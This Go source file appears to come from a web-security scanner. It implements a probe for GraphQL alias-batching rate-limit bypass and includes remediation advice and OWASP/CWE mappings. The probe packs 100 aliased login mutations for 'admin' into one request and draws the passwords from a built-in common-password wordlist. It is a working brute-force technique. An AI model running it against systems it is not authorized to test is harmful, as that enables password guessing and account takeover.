package graphql

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"

	"github.com/swiss-knife-for-web-security/skws/internal/core"
)

// AliasBatchingOptions configures the alias-batching auth-bypass probe.
type AliasBatchingOptions struct {
	// BatchSize is the number of aliased fields packed into a single
	// request. 100 is the canonical bug-bounty value — large enough to
	// bypass per-request rate limits but small enough that most servers
	// don't refuse the request outright. Some PortSwigger labs use 1000.
	BatchSize int
	// FieldName is the GraphQL field/mutation we alias. Defaults to
	// "login" because authentication mutations are the highest-value
	// target of this technique.
	FieldName string
	// FieldArgs is the GraphQL argument expression used inside each
	// aliased call. Each alias receives a unique variant via the
	// VariantMutator callback below; this string is the template.
	// Example: `(username: "admin", password: "PASSWORD")` — the
	// mutator will substitute PASSWORD per-alias.
	FieldArgs string
	// VariantMutator returns a per-alias version of FieldArgs. Defaults
	// to a brute-force password mutator that walks a 100-entry common-
	// password wordlist; pass a custom function to test a different
	// dimension (token list, OTP digit space, etc.).
	VariantMutator func(idx int) string
	// SubSelection is the GraphQL sub-selection (the body inside the
	// curly braces) for each aliased call. Defaults to "{ token user }"
	// which is a reasonable starting set for login mutations.
	SubSelection string
	// MaxResponseBytes caps the response body we'll process. Defaults
	// to 4 MiB; servers that bypass aliasing-rate-limits often respond
	// with very large bodies for big batches.
	MaxResponseBytes int
}

// DefaultAliasBatchingOptions returns sane defaults: a 100-alias login
// mutation brute-force probe with the built-in common-password wordlist.
func DefaultAliasBatchingOptions() AliasBatchingOptions {
	return AliasBatchingOptions{
		BatchSize:        100,
		FieldName:        "login",
		FieldArgs:        `(username: "admin", password: "PASSWORD")`,
		SubSelection:     "{ token user }",
		MaxResponseBytes: 4 * 1024 * 1024,
		VariantMutator:   defaultPasswordVariantMutator,
	}
}

// commonPasswords is a tiny built-in wordlist for the default mutator.
// Keep it short — alias-batching is a probe, not a real cracker. If a
// caller needs a real wordlist they should pass a custom VariantMutator.
var commonPasswords = []string{
	"password", "123456", "password123", "admin", "admin123", "letmein",
	"qwerty", "welcome", "monkey", "12345678", "abc123", "111111",
	"iloveyou", "1234567", "sunshine", "princess", "trustno1", "master",
	"login", "passw0rd", "starwars", "dragon", "ninja", "azerty",
	"baseball", "football", "shadow", "michael", "superman", "hello",
	"qazwsx", "p@ssw0rd", "P@ssw0rd!", "Welcome1", "Test123", "ChangeMe!",
	"Spring2024", "Winter2024", "Summer2024", "Autumn2024",
	"Password!", "Password1", "P@ssword", "Admin123!", "admin@123",
	"hunter2", "pikachu", "tinkle", "freedom", "whatever",
}

func defaultPasswordVariantMutator(idx int) string {
	// Wrap around the wordlist so any BatchSize is valid.
	return commonPasswords[idx%len(commonPasswords)]
}

// aliasBatchResponse is the GraphQL response shape we expect: a JSON
// object with "data" (map of alias -> result) and optional "errors".
type aliasBatchResponse struct {
	Data   map[string]json.RawMessage `json:"data"`
	Errors []struct {
		Message string `json:"message"`
	} `json:"errors"`
}

// DetectAliasBatching probes a GraphQL endpoint for the alias-batching
// authentication-rate-limit bypass (PortSwigger Web Security Academy
// "Bypassing rate limits using GraphQL aliases").
//
// The technique: a typical login mutation is rate-limited per-request,
// but GraphQL's alias syntax lets you pack N independent calls inside
// a single request. If the server processes all N calls and returns N
// results without triggering its rate limiter, an attacker can attempt
// hundreds of password guesses while the rate limiter sees one request.
//
// Probe shape:
//
//   - Phase 1: send a single non-aliased login mutation. Capture the
//     server's "wrong password" response shape (status, body, error
//     count). This is the per-call ground truth.
//   - Phase 2: send a single request containing BatchSize aliased calls
//     to the same mutation, each with a different password. Decode the
//     response.
//
// Detection:
//
//   - If the response contains BatchSize entries in "data" (one per
//     alias) and at least 80% of them produced a per-call result that
//     looks like the phase-1 response (i.e., the mutation actually
//     executed for that alias), the rate-limit bypass is real and we
//     emit a Critical finding.
//   - If the server rejected the request entirely (4xx, errors-only),
//     no finding — the server (or its WAF) blocks aliased batches.
//   - If the server returned fewer than BatchSize entries OR most of
//     them are errors, it's likely rejecting individual calls — partial
//     enforcement that's worth reporting (High) but not Critical.
//
// We deliberately do NOT scan the response for a specific success
// password. Many labs short-circuit auth and emit different bodies for
// the right password, but real targets often require a separate path
// to confirm; this probe reports the rate-limit bypass primitive
// itself, not an end-to-end account compromise.
func (d *Detector) DetectAliasBatching(ctx context.Context, target string, opts AliasBatchingOptions) (*DetectionResult, error) {
	opts = applyAliasBatchingDefaults(opts)
	result := &DetectionResult{Findings: make([]*core.Finding, 0)}

	if err := ctx.Err(); err != nil {
		return result, err
	}

	// Phase 1: single-call ground truth.
	singleQuery := fmt.Sprintf("mutation { %s%s %s }",
		opts.FieldName, replacePassword(opts.FieldArgs, opts.VariantMutator(0)), opts.SubSelection)
	singleBody, _ := json.Marshal(map[string]string{"query": singleQuery})
	singleResp, err := d.client.PostJSON(ctx, target, string(singleBody))
	if err != nil {
		return result, fmt.Errorf("ground-truth probe: %w", err)
	}
	// A server that rejects unauthenticated mutations entirely (401/403)
	// or that gates introspection / is offline (5xx) gives us nothing
	// to compare against — bail rather than emit FPs.
	if singleResp.StatusCode < 200 || singleResp.StatusCode >= 500 {
		return result, nil
	}

	// Phase 2: aliased batch. Each alias is `a<idx>: login(...) { ... }`.
	var b strings.Builder
	b.WriteString("mutation {\n")
	for i := 0; i < opts.BatchSize; i++ {
		fmt.Fprintf(&b, "  a%d: %s%s %s\n",
			i, opts.FieldName,
			replacePassword(opts.FieldArgs, opts.VariantMutator(i)),
			opts.SubSelection)
	}
	b.WriteString("}\n")
	batchBody, _ := json.Marshal(map[string]string{"query": b.String()})

	batchResp, err := d.client.PostJSON(ctx, target, string(batchBody))
	if err != nil {
		return result, fmt.Errorf("batch probe: %w", err)
	}

	// Hard rejection: the server refused the batch outright.
	if batchResp.StatusCode == 429 || batchResp.StatusCode == 413 {
		return result, nil
	}
	if batchResp.StatusCode < 200 || batchResp.StatusCode >= 300 {
		return result, nil
	}

	// Cap response size before parsing to bound memory.
	body := batchResp.Body
	if len(body) > opts.MaxResponseBytes {
		body = body[:opts.MaxResponseBytes]
	}

	var parsed aliasBatchResponse
	if err := json.Unmarshal([]byte(body), &parsed); err != nil {
		// Non-JSON body — server probably returned an error page.
		return result, nil
	}

	if len(parsed.Data) == 0 {
		return result, nil
	}

	// Count aliases that produced a non-null entry. If 80%+ of the
	// BatchSize aliases came back with results, the server processed the
	// whole batch — rate limit was bypassed.
	executedCount := 0
	for k, raw := range parsed.Data {
		if !strings.HasPrefix(k, "a") {
			continue
		}
		if len(raw) > 0 && string(raw) != "null" {
			executedCount++
		}
	}

	if executedCount == 0 {
		return result, nil
	}

	pct := float64(executedCount) / float64(opts.BatchSize)
	severity := core.SeverityHigh
	title := "GraphQL Alias-Batching: Partial Rate-Limit Bypass"
	if pct >= 0.8 {
		severity = core.SeverityCritical
		title = "GraphQL Alias-Batching: Authentication Rate-Limit Bypass"
	}

	finding := core.NewFinding(title, severity)
	finding.URL = target
	finding.Tool = "graphql-detector"
	finding.Description = fmt.Sprintf(
		"The endpoint accepted a single GraphQL request containing %d aliased calls to the %q mutation, executing %d of them (%.0f%%). This bypasses per-request rate limits and lets an attacker attempt that many guesses (passwords, tokens, OTP codes) per request.",
		opts.BatchSize, opts.FieldName, executedCount, pct*100,
	)
	finding.Evidence = strings.Join([]string{
		fmt.Sprintf("ground-truth single-call status: %d", singleResp.StatusCode),
		fmt.Sprintf("batched-call status:             %d", batchResp.StatusCode),
		fmt.Sprintf("aliases requested:               %d", opts.BatchSize),
		fmt.Sprintf("aliases executed:                %d (%.0f%%)", executedCount, pct*100),
		fmt.Sprintf("server errors in batch:          %d", len(parsed.Errors)),
	}, "\n")
	finding.Remediation = "Apply rate limiting at the GraphQL document level — count the number of aliased fields in the parsed query, not the number of HTTP requests. Reject queries that exceed an alias budget for sensitive operations (login, password reset, OTP). Disable field aliasing entirely for authentication mutations if your engine supports it. Apollo Server supports operation complexity / alias-count plugins; Hasura supports query depth and node count limits. Reference: PortSwigger Web Security Academy 'Bypassing rate limits using GraphQL aliases'."
	finding.WithOWASPMapping(
		[]string{"WSTG-INPV-13"},
		[]string{"A04:2025"},
		[]string{"CWE-307", "CWE-799"},
	)
	finding.APITop10 = []string{"API4:2023"}

	result.Findings = append(result.Findings, finding)
	return result, nil
}

// replacePassword substitutes the literal token PASSWORD inside fieldArgs
// with the supplied value, JSON-quoting it correctly. We do not use
// strings.Replacer because the token is meant to appear in exactly one
// place (the password value); multiple occurrences would be a misuse.
func replacePassword(fieldArgs, password string) string {
	// Escape any embedded quotes/backslashes; the resulting value will be
	// pasted directly into the GraphQL string literal.
	escaped := strings.ReplaceAll(password, `\`, `\\`)
	escaped = strings.ReplaceAll(escaped, `"`, `\"`)
	return strings.Replace(fieldArgs, "PASSWORD", escaped, 1)
}

func applyAliasBatchingDefaults(opts AliasBatchingOptions) AliasBatchingOptions {
	def := DefaultAliasBatchingOptions()
	if opts.BatchSize <= 0 {
		opts.BatchSize = def.BatchSize
	}
	if opts.FieldName == "" {
		opts.FieldName = def.FieldName
	}
	if opts.FieldArgs == "" {
		opts.FieldArgs = def.FieldArgs
	}
	if opts.SubSelection == "" {
		opts.SubSelection = def.SubSelection
	}
	if opts.VariantMutator == nil {
		opts.VariantMutator = def.VariantMutator
	}
	if opts.MaxResponseBytes <= 0 {
		opts.MaxResponseBytes = def.MaxResponseBytes
	}
	return opts
}
